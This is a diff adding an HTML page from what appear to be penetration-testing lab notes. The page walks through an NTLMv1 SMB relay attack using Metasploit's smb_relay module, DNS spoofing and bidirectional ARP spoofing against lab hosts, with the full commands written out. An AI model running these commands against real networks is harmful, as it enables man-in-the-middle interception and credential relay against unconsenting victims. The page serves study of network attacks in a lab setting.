@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3. NTLMv1 Relay (Metasploit)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>3. NTLMv1 Relay (Metasploit)</h1><br />*Only work if &quot;Network security: LAN Manager
+    authentication level&quot; is set to &quot;Send LM &amp; NTLM responses&quot;<br /> To do it(Windows 7): search bar
+    → “Edit group policy” → Local Policies → Security Options<br /> or see <a
+      href="Home--Penetration_Test_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--NetNTLM_attacks--How_Increase_security_against.html">here</a>
+    ← <br /><br />To exploit the NTLMv1 protocol we are going to use the module <a
+      href="https://www.rapid7.com/db/modules/exploit/windows/smb/smb_relay" target="_blank">https://www.rapid7.com/db/modules/exploit/windows/smb/smb_relay</a><br />(exploit/windows/smb/smb_relay)<br />Worth
+    noting though that <span style="text-decoration:underline;">this module only supports
+      NTLMv1</span><br /><br /><br />Analyze with Wireshark the Network and observe that 172.16.5.30 issues a SMB
+    connection to any hosts on the *.sportsfoo.com domain<br /> <a href=""><img src="images/802-1.png"
+        alt="images/802-1.png" /></a><br /> <br /><strong>Attack Schematized</strong><br /> <a href=""><img
+        src="images/802-2.png" alt="images/802-2.png" /></a><br /><br /><strong>
+      <h3>Exploit: </h3>
+    </strong><br />
+    <div class="codebox">
+      <div class="codebox">
+        service&nbsp;postgresql&nbsp;start<br />msfdb&nbsp;init<br />msfconsole<br />use&nbsp;exploit/windows/smb/smb_relay<br />show&nbsp;options<br />set&nbsp;SMBHOST&nbsp;&lt;Server_IP&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Domain&nbsp;Controller<br />set&nbsp;LHOST&nbsp;&lt;Attacker_Interface_IP&gt;<br />set&nbsp;SRVHOST&nbsp;&lt;Attacker_Interface_IP&gt;<br />run
+      </div>
+    </div><br /><br /><a href=""><img src="images/802-3.png" alt="images/802-3.png" /></a><br /><br /><br /><strong>
+      <h3>Configure dnsspoof</h3>
+    </strong><br />configure dnsspoof in order to redirect the victim to our Metasploit system every time there&#39;s an
+    SMB connection to any host in the domain: sportsfoo.com<br />
+    <div class="codebox">
+      <div class="codebox">
+        &nbsp;echo&nbsp;&quot;172.16.5.150&nbsp;*.sportsfoo.com&quot;&nbsp;&gt;&nbsp;dns.txt<br />&nbsp;dnsspoof&nbsp;-i&nbsp;tap0&nbsp;-f&nbsp;dns.txt
+      </div>
+    </div><br /> <a href=""><img src="images/802-4.png" alt="images/802-4.png" /></a><br /> .... after some time
+    ...<br /> <a href=""><img src="images/802-5.png" alt="images/802-5.png" /></a><br /><br /><br /><strong>Activate the
+      MiTM attack using the ARP Spoofing technique</strong> (To understand it check chapter <a
+      href="Home--Penetration_Test_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--Active_Sniffing-Spoofing--ARP_Cache_Poisoning_(Switch).html">ARP
+      Cache Poisoning</a>)<br />Enable IP forwarding on the attacker machine<br />
+    <div class="codebox">
+      <div class="codebox">echo&nbsp;1&nbsp;&gt;&nbsp;/proc/sys/net/ipv4/ip_forward</div>
+    </div><br /><br />Note that the 172.16.50.10 is not the name server, in fact there are no DNS queries to
+    172.16.5.10, the name server is outside the network. Because of that we need to use 172.16.5.1 that is the address
+    of the router<br />In two separated terminals, start the ARP Spoof attack against 172.16.5.30 and respectively
+    172.16.5.1 using these commands: <br />
+    <div class="codebox">
+      <div class="codebox">arpspoof&nbsp;-i&nbsp;tap0&nbsp;-t&nbsp;172.16.5.30&nbsp;172.16.5.1</div>
+    </div> <br /> <a href=""><img src="images/802-6.png" alt="images/802-6.png" /></a><br />
+    <div class="codebox">
+      <div class="codebox">arpspoof&nbsp;-i&nbsp;tap0&nbsp;-t&nbsp;172.16.5.1&nbsp;172.16.5.30</div>
+    </div> <br /> <a href=""><img src="images/802-7.png"
+        alt="images/802-7.png" /></a><br /><br /><strong>Exploited!</strong><br /><a href=""><img src="images/802-8.png"
+        alt="images/802-8.png" /></a><br /><br /><br /><br />Bibliography:<br /><a
+      href="https://ivanitlearning.wordpress.com/2018/11/22/dns-enumeration-smb-relay/" target="_blank">https://ivanitlearning.wordpress.com/2018/11/22/dns-enumeration-smb-relay/</a>
+  </div>
+</body>
+
+</html>
